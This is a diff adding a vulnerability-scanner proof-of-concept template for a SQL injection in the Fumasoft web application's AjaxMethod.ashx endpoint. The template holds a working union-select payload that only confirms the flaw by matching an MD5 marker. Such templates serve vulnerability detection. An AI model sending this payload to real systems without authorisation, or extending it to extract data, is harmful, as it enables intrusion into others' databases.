@@ -1,0 +1,15 @@
+name: poc-yaml-fumasoft-sqli
+manual: true
+transport: http
+rules:
+    sqli:
+        request:
+            method: GET
+            path: /Ajax/AjaxMethod.ashx?action=getEmpByname&Name=Y' union select substring(sys.fn_sqlvarbasetostr(HASHBYTES('MD5','89888')),3,32)--
+        expression: response.status == 500 && "00a6b8560ba509f8ca05d4373efb0e9d".bmatches(response.body)
+expression: sqli()
+detail:
+    author: li8u99(https://github.com/li8u99)
+    links:
+        - https://github.com/PeiQi0/PeiQi-WIKI-Book/blob/f6a36903c4459f9111aebde6e483f4e744c6fe5a/docs/wiki/webapp/%E5%AD%9A%E7%9B%9F%E4%BA%91/%E5%AD%9A%E7%9B%9F%E4%BA%91%20AjaxMethod.ashx%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md
+
